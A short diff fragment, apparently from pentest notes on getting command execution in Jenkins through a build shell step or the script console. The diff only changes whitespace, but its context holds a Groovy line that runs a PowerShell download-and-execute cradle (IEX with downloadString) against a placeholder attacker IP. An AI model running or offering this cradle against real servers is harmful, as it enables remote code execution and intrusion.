@@ -6,13 +6,13 @@
 
 ## Command execution
 
-1. Create new project
-2. Build -> execute shell
+1. Create new project  
+2. Build -> execute shell  
 
 or
 
-1. Manage jenkins
-2. Script console
+1. Manage jenkins  
+2. Script console  
 
 ```groovy
 cmd = """ powershell "IEX(NewObject Net.WebClient).downloadString('http://<ip>/file')" """
